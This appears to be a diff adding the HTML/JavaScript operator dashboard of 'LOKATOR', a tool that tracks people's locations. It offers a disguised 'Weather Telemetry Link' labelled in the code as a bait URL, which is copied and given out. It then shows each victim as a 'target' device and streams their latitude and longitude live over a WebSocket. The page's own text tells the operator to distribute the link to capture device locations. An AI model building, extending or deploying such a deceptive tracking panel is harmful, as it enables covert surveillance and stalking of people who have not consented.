@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOKATOR | Target Control Hub</title>
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #05050a;
+            --bg-card: rgba(13, 13, 25, 0.6);
+            --border-color: rgba(255, 255, 255, 0.06);
+            --border-hover: rgba(124, 77, 255, 0.3);
+            --text-primary: #f1f3f9;
+            --text-secondary: #858fa3;
+            --accent-primary: #7c4dff;
+            --accent-secondary: #00e5ff;
+            --accent-gradient: linear-gradient(135deg, var(--accent-primary) 0%, var(--accent-secondary) 100%);
+            --font-main: 'Outfit', sans-serif;
+            --font-mono: 'Space Grotesk', sans-serif;
+            --success: #00e676;
+            --danger: #ff1744;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: var(--font-main);
+        }
+
+        body {
+            background-color: var(--bg-color);
+            background-image: 
+                radial-gradient(at 0% 0%, rgba(124, 77, 255, 0.1) 0px, transparent 50%),
+                radial-gradient(at 100% 100%, rgba(0, 229, 255, 0.08) 0px, transparent 50%);
+            color: var(--text-primary);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+        }
+
+        /* Header Navigation */
+        header {
+            background: rgba(5, 5, 10, 0.8);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-bottom: 1px solid var(--border-color);
+            padding: 16px 24px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header-logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .header-logo svg {
+            width: 32px;
+            height: 32px;
+            fill: none;
+            stroke: url(#header-grad);
+            stroke-width: 2;
+        }
+
+        .header-title {
+            font-family: var(--font-mono);
+            font-size: 20px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            background: linear-gradient(to right, #fff, var(--text-secondary));
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .header-status {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-family: var(--font-mono);
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            background: rgba(0, 230, 118, 0.08);
+            border: 1px solid rgba(0, 230, 118, 0.15);
+            padding: 6px 12px;
+            border-radius: 20px;
+            color: var(--success);
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background-color: var(--success);
+            border-radius: 50%;
+            display: inline-block;
+            box-shadow: 0 0 10px var(--success);
+            animation: pulse 1.8s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.9); opacity: 0.6; }
+            50% { transform: scale(1.1); opacity: 1; box-shadow: 0 0 14px var(--success); }
+            100% { transform: scale(0.9); opacity: 0.6; }
+        }
+
+        /* Logout link */
+        .logout-link {
+            color: var(--text-secondary);
+            font-size: 14px;
+            text-decoration: none;
+            transition: color 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .logout-link:hover {
+            color: var(--danger);
+        }
+
+        /* Dashboard Container */
+        .dashboard-container {
+            max-width: 1200px;
+            width: 100%;
+            margin: 32px auto;
+            padding: 0 24px;
+            flex: 1;
+            display: grid;
+            grid-template-columns: 350px 1fr;
+            gap: 32px;
+        }
+
+        @media (max-width: 900px) {
+            .dashboard-container {
+                grid-template-columns: 1fr;
+                margin: 16px auto;
+            }
+        }
+
+        /* Glass Cards */
+        .dashboard-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            padding: 24px;
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            height: fit-content;
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.25);
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 14px;
+        }
+
+        .card-header svg {
+            color: var(--accent-secondary);
+        }
+
+        .card-title {
+            font-family: var(--font-mono);
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--text-secondary);
+            font-weight: 700;
+        }
+
+        /* Telemetry Generator UI */
+        .bait-url-box {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .bait-label {
+            font-size: 12px;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .bait-value-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1.5px solid var(--border-color);
+            border-radius: 8px;
+            padding: 8px 12px;
+            overflow: hidden;
+        }
+
+        .bait-value {
+            font-family: var(--font-mono);
+            font-size: 13px;
+            color: var(--accent-secondary);
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            flex: 1;
+        }
+
+        .copy-btn {
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            cursor: pointer;
+            padding: 4px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+        }
+
+        .copy-btn:hover {
+            color: #fff;
+            background: rgba(255, 255, 255, 0.05);
+        }
+
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 16px;
+        }
+
+        .stat-box {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .stat-icon {
+            width: 44px;
+            height: 44px;
+            border-radius: 10px;
+            background: rgba(124, 77, 255, 0.1);
+            color: var(--accent-primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .stat-data {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .stat-num {
+            font-size: 24px;
+            font-weight: 700;
+            color: #fff;
+            line-height: 1;
+            margin-bottom: 4px;
+            font-family: var(--font-mono);
+        }
+
+        .stat-lbl {
+            font-size: 12px;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* Console/Activity log */
+        .console-box {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 16px;
+            height: 180px;
+            font-family: var(--font-mono);
+            font-size: 11px;
+            color: var(--text-secondary);
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.5);
+        }
+
+        .console-line {
+            line-height: 1.4;
+            word-break: break-all;
+        }
+
+        .console-system { color: var(--text-secondary); }
+        .console-success { color: var(--success); }
+        .console-info { color: var(--accent-secondary); }
+
+        /* Targets Column */
+        .targets-column {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .section-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .section-title {
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            color: #fff;
+        }
+
+        .targets-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+            gap: 20px;
+        }
+
+        /* Target Cards */
+        .target-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 6px 20px rgba(0,0,0,0.15);
+        }
+
+        .target-card:hover {
+            transform: translateY(-4px);
+            border-color: var(--border-hover);
+            box-shadow: 0 10px 24px rgba(124, 77, 255, 0.12);
+        }
+
+        .target-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: var(--accent-gradient);
+            opacity: 0.6;
+        }
+
+        .target-meta {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .target-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.03);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--accent-secondary);
+        }
+
+        .target-status-pill {
+            font-family: var(--font-mono);
+            font-size: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            background: rgba(0, 230, 118, 0.05);
+            border: 1px solid rgba(0, 230, 118, 0.15);
+            color: var(--success);
+            padding: 3px 8px;
+            border-radius: 12px;
+        }
+
+        .target-info {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .target-id {
+            font-family: var(--font-mono);
+            font-size: 16px;
+            font-weight: 500;
+            color: #fff;
+            letter-spacing: 0.5px;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            overflow: hidden;
+        }
+
+        .target-subtitle {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        .track-btn {
+            width: 100%;
+            background: linear-gradient(135deg, rgba(124, 77, 255, 0.15) 0%, rgba(0, 229, 255, 0.05) 100%);
+            border: 1px solid rgba(124, 77, 255, 0.2);
+            color: #fff;
+            padding: 10px 14px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            transition: all 0.3s;
+            text-decoration: none;
+        }
+
+        .track-btn:hover {
+            background: var(--accent-gradient);
+            border-color: transparent;
+            box-shadow: 0 5px 15px rgba(124, 77, 255, 0.3);
+        }
+
+        /* Empty State */
+        .empty-state {
+            grid-column: 1 / -1;
+            background: rgba(255, 255, 255, 0.01);
+            border: 1.5px dashed var(--border-color);
+            border-radius: 16px;
+            padding: 60px 40px;
+            text-align: center;
+            color: var(--text-secondary);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+        }
+
+        .empty-state svg {
+            width: 48px;
+            height: 48px;
+            color: rgba(255,255,255,0.1);
+        }
+
+        /* Footer */
+        footer {
+            border-top: 1px solid var(--border-color);
+            padding: 24px;
+            text-align: center;
+            font-size: 13px;
+            color: var(--text-secondary);
+            background: rgba(5, 5, 10, 0.9);
+            margin-top: auto;
+        }
+
+        footer a {
+            color: #fff;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        footer a:hover {
+            color: var(--accent-secondary);
+        }
+    </style>
+</head>
+
+<body>
+    <!-- SVG Gradient Definitions -->
+    <svg style="width:0;height:0;position:absolute;" aria-hidden="true" focusable="false">
+        <linearGradient id="header-grad" x2="1" y2="1">
+            <stop offset="0%" stop-color="#7c4dff" />
+            <stop offset="100%" stop-color="#00e5ff" />
+        </linearGradient>
+    </svg>
+
+    <!-- Header Navigation -->
+    <header>
+        <div class="header-logo">
+            <svg viewBox="0 0 24 24">
+                <path d="M12 2a8 8 0 0 0-8 8c0 5.25 8 12 8 12s8-6.75 8-12a8 8 0 0 0-8-8z"/>
+                <circle cx="12" cy="10" r="3"/>
+            </svg>
+            <span class="header-title">LOKATOR // PANEL</span>
+        </div>
+
+        <div class="header-status">
+            <span class="status-dot"></span>
+            <span>SYSTEM ACTIVE</span>
+        </div>
+
+        <a href="/login" class="logout-link" onclick="document.cookie='token=; Max-Age=0; path=/;';">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/>
+                <polyline points="16 17 21 12 16 7"/>
+                <line x1="21" y1="12" x2="9" y2="12"/>
+            </svg>
+            <span>Exit Console</span>
+        </a>
+    </header>
+
+    <!-- Dashboard Container -->
+    <div class="dashboard-container">
+        <!-- Sidebar controls -->
+        <aside class="dashboard-card">
+            <div class="card-header">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="3" y="3" width="18" height="18" rx="2" ry="2"/>
+                    <line x1="9" y1="3" x2="9" y2="21"/>
+                </svg>
+                <h2 class="card-title">Telemetry Control</h2>
+            </div>
+
+            <!-- Stats -->
+            <div class="stats-grid">
+                <div class="stat-box">
+                    <div class="stat-icon">
+                        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/>
+                            <circle cx="9" cy="7" r="4"/>
+                            <path d="M23 21v-2a4 4 0 0 0-3-3.87"/>
+                            <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
+                        </svg>
+                    </div>
+                    <div class="stat-data">
+                        <span class="stat-num" id="total-targets">0</span>
+                        <span class="stat-lbl">Active Targets</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Bait Url Setup -->
+            <div class="bait-url-box">
+                <span class="bait-label">Weather Telemetry Link</span>
+                <div class="bait-value-container">
+                    <span class="bait-value" id="bait-url">{{ global.remoteURL }}/weather</span>
+                    <button class="copy-btn" id="btn-copy-url" title="Copy Link to Clipboard">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+                            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Console Log -->
+            <div class="card-header" style="margin-top: 10px; padding-bottom: 10px;">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <polyline points="4 17 10 11 4 5"/>
+                    <line x1="12" y1="19" x2="20" y2="19"/>
+                </svg>
+                <h2 class="card-title">Live console feed</h2>
+            </div>
+            <div class="console-box" id="console-feed">
+                <div class="console-line console-system">[-] Initializing control channel...</div>
+                <div class="console-line console-system">[-] WebSocket handshake pending...</div>
+            </div>
+        </aside>
+
+        <!-- Targets Listing Section -->
+        <main class="targets-column">
+            <div class="section-header">
+                <h2 class="section-title">Tracked Devices</h2>
+            </div>
+
+            <div class="targets-grid" id="tar-content">
+                {{ for(value, key in TARGETS) }}
+                <div class="target-card" data-id="{{ key }}">
+                    <div class="target-meta">
+                        <div class="target-icon">
+                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="5" y="2" width="14" height="20" rx="2" ry="2"/>
+                                <line x1="12" y1="18" x2="12.01" y2="18"/>
+                            </svg>
+                        </div>
+                        <span class="target-status-pill">Active</span>
+                    </div>
+                    <div class="target-info">
+                        <span class="target-id">{{ key }}</span>
+                        <span class="target-subtitle">Broadcasting Telemetry</span>
+                    </div>
+                    <a href="/map?id={{ key }}" class="track-btn">
+                        <span>Launch Live Map</span>
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <polygon points="3 11 22 2 13 21 11 13 3 11"/>
+                        </svg>
+                    </a>
+                </div>
+                {{/}}
+
+                <!-- Empty state when no targets exist in database -->
+                <div class="empty-state" id="empty-state-el" style="display: none;">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="10"/>
+                        <line x1="12" y1="8" x2="12" y2="12"/>
+                        <line x1="12" y1="16" x2="12.01" y2="16"/>
+                    </svg>
+                    <div style="font-weight: 500; font-size: 15px; color: #fff;">No Devices Tracked Yet</div>
+                    <div style="font-size: 13px; max-width: 250px;">Distribute the Weather Telemetry Link to begin capturing device locations in real-time.</div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Footer Copyright -->
+    <footer>
+        <p>© 2026 Abhishek (my8051107@gmail.com). All rights reserved. Developed by <a href="https://abhishekraj.netlify.app" target="_blank">Abhishek</a>.</p>
+    </footer>
+
+    <!-- Scripts -->
+    <script src="https://cdn.jsdelivr.net/npm/socket.io@4.8.1/client-dist/socket.io.min.js"></script>
+    <script>
+        const content = document.querySelector("#tar-content");
+        const emptyState = document.querySelector("#empty-state-el");
+        const totalCountEl = document.querySelector("#total-targets");
+        const consoleFeed = document.querySelector("#console-feed");
+
+        // Format timestamps for console logs
+        function getTimeString() {
+            const now = new Date();
+            return `[${now.toTimeString().split(' ')[0]}]`;
+        }
+
+        // Add line to console
+        function writeToConsole(message, type = "system") {
+            const line = document.createElement("div");
+            line.className = `console-line console-${type}`;
+            line.innerText = `${getTimeString()} ${message}`;
+            consoleFeed.appendChild(line);
+            consoleFeed.scrollTop = consoleFeed.scrollHeight;
+        }
+
+        // Update target counts and empty states
+        function updateStats() {
+            const cards = content.querySelectorAll(".target-card");
+            totalCountEl.innerText = cards.length;
+            if (cards.length === 0) {
+                emptyState.style.display = "flex";
+            } else {
+                emptyState.style.display = "none";
+            }
+        }
+
+        // Initialization
+        writeToConsole("System initialized.", "system");
+        updateStats();
+
+        // Setup Copy URL Button
+        const copyBtn = document.querySelector("#btn-copy-url");
+        const baitUrlEl = document.querySelector("#bait-url");
+
+        function copyToClipboard(text) {
+            if (navigator.clipboard && window.isSecureContext) {
+                return navigator.clipboard.writeText(text);
+            } else {
+                return new Promise((resolve, reject) => {
+                    try {
+                        const textArea = document.createElement("textarea");
+                        textArea.value = text;
+                        textArea.style.position = "fixed";
+                        textArea.style.opacity = "0";
+                        document.body.appendChild(textArea);
+                        textArea.focus();
+                        textArea.select();
+                        const successful = document.execCommand('copy');
+                        document.body.removeChild(textArea);
+                        if (successful) resolve();
+                        else reject(new Error("Copy command failed"));
+                    } catch (err) {
+                        reject(err);
+                    }
+                });
+            }
+        }
+
+        if (copyBtn && baitUrlEl) {
+            copyBtn.addEventListener("click", () => {
+                copyToClipboard(baitUrlEl.innerText.trim())
+                    .then(() => {
+                        const originalIcon = copyBtn.innerHTML;
+                        copyBtn.innerHTML = `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#00e676" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>`;
+                        copyBtn.style.pointerEvents = "none";
+                        writeToConsole("Weather link copied to clipboard.", "info");
+                        setTimeout(() => {
+                            copyBtn.innerHTML = originalIcon;
+                            copyBtn.style.pointerEvents = "auto";
+                        }, 2000);
+                    })
+                    .catch(err => {
+                        console.error("Copy failed:", err);
+                        writeToConsole("Failed to copy link automatically.", "error");
+                    });
+            });
+        }
+
+        // Initialize Sockets
+        const socket = io("", {
+            secure: true,
+            path: "/socket.io",
+            transports: ['websocket']
+        });
+
+        socket.on("connect", () => {
+            writeToConsole("WebSocket bridge connected.", "success");
+        });
+
+        socket.on("disconnect", () => {
+            writeToConsole("WebSocket bridge disconnected.", "system");
+        });
+
+        socket.on("user-connected", newId => {
+            writeToConsole(`Target connected: ID(${newId})`, "success");
+            
+            // Check if card already exists
+            if (document.querySelector(`.target-card[data-id="${newId}"]`)) {
+                return;
+            }
+
+            // Create target card dynamically
+            const card = document.createElement('div');
+            card.className = "target-card";
+            card.setAttribute("data-id", newId);
+            card.innerHTML = `
+                <div class="target-meta">
+                    <div class="target-icon">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="5" y="2" width="14" height="20" rx="2" ry="2"/>
+                            <line x1="12" y1="18" x2="12.01" y2="18"/>
+                        </svg>
+                    </div>
+                    <span class="target-status-pill">Active</span>
+                </div>
+                <div class="target-info">
+                    <span class="target-id">${newId}</span>
+                    <span class="target-subtitle">Broadcasting Telemetry</span>
+                </div>
+                <a href="/map?id=${newId}" class="track-btn">
+                    <span>Launch Live Map</span>
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polygon points="3 11 22 2 13 21 11 13 3 11"/>
+                    </svg>
+                </a>
+            `;
+            
+            // Prepend new target card before empty state
+            if (emptyState.style.display !== "none") {
+                emptyState.style.display = "none";
+            }
+            content.insertBefore(card, emptyState);
+            updateStats();
+        });
+
+        // Monitor target location updates in background console
+        socket.on("map-data", data => {
+            writeToConsole(`Recv Telemetry: ID(${data.id}) -> Lat: ${Number(data.lat).toFixed(5)}, Lng: ${Number(data.lng).toFixed(5)}`, "info");
+        });
+    </script>
+</body>
+
+</html>
